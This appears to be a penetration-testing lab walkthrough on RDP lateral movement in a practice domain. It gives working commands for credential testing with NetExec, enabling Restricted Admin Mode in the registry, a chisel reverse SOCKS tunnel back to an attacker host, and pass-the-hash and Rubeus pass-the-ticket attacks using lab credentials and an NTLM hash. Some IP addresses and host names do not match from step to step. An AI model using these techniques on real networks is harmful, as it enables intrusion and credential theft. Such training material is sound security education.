## Remote Desktop Service (RDP) 


> **Remote Desktop Protocol (RDP)** is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. 
> 
> RDP is widely used for remote administration, technical support, and accessing workstations and servers remotely. 
> 
> RDP supports a complete desktop experience, including remote sound, clipboard, printers, and file transfers with high-resolution graphics, which can be scaled down based on bandwidth. 
> 
> **RDP by default uses TCP port 3389** for communication. 



### RDP Rights


> The required rights to connect to RDP depend on the configuration; by default, **only members of the Administrators or Remote Desktop Users groups can connect via RDP**. 
>
> Additionally, an **administrator can grant specific users or groups rights to connect to RDP.**  
>
> Because those rights are set locally, the only way to enumerate them is if we have Administrative rights on the target computer. 



### RDP Enumeration 


> To use RDP for lateral movement we need to be aware if RDP is present on the enviroment we are testing, we can use **NMAP or any other network enumeration tool to search for port 3389** and once we get a list of targets, we can use that list with tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) to test multiple credentials. 
>
> **Note** RDP uses **TCP port 3389 by default**, but administrators can configure it in any other port. 
>
> To test credentials againts RDP we will use **netexec**. Let's select the protocol **rdp** and the account **Helen and the password RedRiot88:** 
>
> We confirm Helen has RDP rights on SRV01. Remember that **(Pwn3d!)** doesn't mean we have administrative rights on the target machine but that we have rights to connect to RDP. 
>
> IP Address = 10.129.142.194
> FQDN = srv01.inlanefreight.local


![Lateral Movement](/Remote-Desktop-Services/images/nmap.png) 


![Lateral Movement](/Remote-Desktop-Services/images/netexec.png) 




### Lateral Movement From Windows 



> To connect to RDP from Windows we can use the default windows **Remote Desktop Connection** client that can be accessed by running **mstsc on Run, Cmd or PowerShell**: 

	
	C:\> mstsc.exe
	

> This will open a client where we can specify the target IP address or domain name, and once we click Connect, it will prompt us for the credentials: 


![Lateral Movement](/Remote-Desktop-Services/images/mstsc.png) 



> Here are some actions taht can be efficiently executed using RDP: 
>
>> - **File Transfer:** Transfer files between the local and remote computers by dragging and dropping files or using copy and paste. 
>>
>> - **Running Applications:** Run applications on the remote computer. This is useful for accessing software that is only installed on the remote machine. 
>>
>> - **Printing:** Print documents from the remote computer to a printer connected to the local computer. 
>>
>> - **Audio and Video Streaming:** Stream audio and video from the remote computer to the local machine, which is useful for multimedia applications. 
>>
>> - **Clipboard Sharing:** Share the clipboard between the local and remote computers, allowing you to copy and paste text and images across machines. 




### Lateral Movement From Linux 


> To connect to RDP from Linux, we can use the [xfreerdp](https://github.com/FreeRDP/FreeRDP) command-line tool. Here is an example of how to use it: 


	
	$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.142.194 /dynamic-resolution /drive:tmp,/home/kali/tools
	
	

> In this command: 
> 
> - **/u:Helen** specifies the username.
>
> - **/p:'RedRiot88'** specifies the password.
>
> - **/v:10.129.183.11** specifies the IP address of the target machine.
>
> - **/dynamic-resolution** enables dynamic resolution adjustment which allow us to resize the windows dynamicaly. 
>
> - **/drive:tmp,/home/kali/Tools** redirects the local filesystem to the remote session, making it accessible from the remote Windows machine.
>
> By running this command in the terminal, we can establish an RDP connection to the specified Windows machine and perform similar actions as we would using the Windows Remote Desktop Connection client.



#### Optimizing xfreerdp for Low Latency Networks or Proxy Connections


> If you are using xfreerdp over a proxy or with slow network connectivity, we can improve the session speed by using the following additional options: 

	
	$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.183.11 /dynamic-resolution /drive:tmp,/home/kali/Tools /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
	

![Lateral Movement](/Remote-Desktop-Services/images/xfreerdp.png) 


> In this command: 
>
> - **/bpp:8:** Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted. 
>
> - **/compression:** Enables compression to reduce the amount of data sent over the network. 
>
> - **-themes:** Disables desktop themes to reduce graphical data.
>
> - **-wallpaper:** Disables the desktop wallpaper to further reduce graphical data. 
>
> - **/clipboard:** Enables sharing between the local and remote machines. 
>
> - **/audio-mode:0** Disables audio redirection to save bandwidth. 
>
> - **/auto-reconnect:** Automatically reconnects if the connection drops, improving session stability. 
>
> - **-glyph-cache:** Enables caching of glyphs (text characters) to reduce the amount of data sent for text rendering. 
>
>
> Using these options helps to optimize the performance of the RDP session, ensuring a smoother experience even in less-than-ideal network conditions. 



### Restricted Admin Mode 


> Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. 
> When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system. 
> This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account. 
> 
> Although this mode prevents the caching of credentials, if enabled, it **allows the execution of Pass the Hash or Pass the Ticket for lateral movement**. 
>
>
> To confirm if **Restricted Admin Mode is enabled**, we can query the following registry key: 

	
	C:\> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin 
	

> The value of **DisableRestrictedAdmin** indicates the status of **Restricted Admin Mode:**
>
> - If the value is **0, Restricted Admin Mode is enabled.** 
>
> - If the value is **1, Restricted Admin Mode is disabled.** 
>
> If the key does not exist it means that is disabled and, we will see the following error message: 





> Additionally, to **enable Restricted Admin Mode**, we would set the **DisableRestrictedAdmin value to 0**. Here is the command to enable it: 

	
	C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
	

> And to **disable Restricted Admin Mode**, set the **DisableRestrictedAdmin value to 1:** 

	
	C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD 
	
> **Note:** Only members of the Administrators group can abuse Restricted Admin Mode. 



### Pivoting


> It is common that we will need to use pivoting to perform lateral movement, in the module [Pivoting, Tunneling and Port Forwarding](https://academy.hackthebox.com/module/details/158) we explain everything we need to know about pivoting. 
>
> In this lab, we have access to one single host. To connect to the other machines from our Linux attack host, we will need to set up a pivot method; in this case, we will use [chisel](https://github.com/jpillora/chisel). 
> 
> We will need to configure a ***socks5 SOCKS proxy on port 1080 in the /etc/proxychains.conf file:*** 


![Lateral Movement](/Remote-Desktop-Services/images/proxy-conf.png) 

> Next, on our Linux machine, we will initiate reverse port forwarding server: 


![Lateral Movement](/Remote-Desktop-Services/images/chisel-server.png) 

> Then, in **SRV01**, we will connect to the server with the following command: 

	
	C:\> chisel.exe client <VPN IP:PORT> R.socks
	

![Lateral Movement](/Remote-Desktop-Services/images/chisel-client.png) 

> If we run the ipconfig /all command on the Windows host we can see another internal IP 172.20.0.1. We can create a bash script and run a ping sweep against this subnet and we can see 3 additional hosts on this subnet that reply to our ping sweep. 


![Lateral Movement](/Remote-Desktop-Services/images/ping-sweep.png) 

1. 172.20.0.10
2. 172.20.0.51
3. 172.20.0.52


### Pass the Hash and Pass the Ticket for RDP 


> Once we confirm Restricted Admin Mode is enabled, or if we can enable it, we can proceed to perform Pass the Hash or Pass the Ticket attacks with RDP. 
> 
> To perform Pass the Hash from a Linux machine, we can use xfreerdp with the /pth option to use a hash and connect to RDP. Here's an example command: 
>
> As we can see RestrictedAdmin is enabled on host 172.20.0.52


![Lateral Movement](/Remote-Desktop-Services/images/reg-check.png) 


	
	$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
	

> For **Pass the Ticket** we can use [Rubeus](https://github.com/GhostPack/Rubeus). We will forge a ticket using Helen's hash. First we need to launch a sacrificial process with the option createnetonly: 

	
	C:\> Rubeus.exe createnetonly /program:powershell.exe /show
	


![Lateral Movement](/Remote-Desktop-Services/images/ptt-1.png) 


> In the new PowerShell window we will use Helen's hash to forge a Ticket-Granting ticket (TGT): 

	
	PS C:\> .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt
	

![Lateral Movement](/Remote-Desktop-Services/images/ptt-2.png) 



> From the window where we imported the ticket, we can use the mstsc /restrictedAdmin command: 

	
	PS C:\Tools> mstsc.exe /restrictedAdmin
	
> And we have successfully pivoted from SVC01 to SVC02 with a Pass the Ticket attack. 

![Lateral Movement](/Remote-Desktop-Services/images/ptt-3.png) 


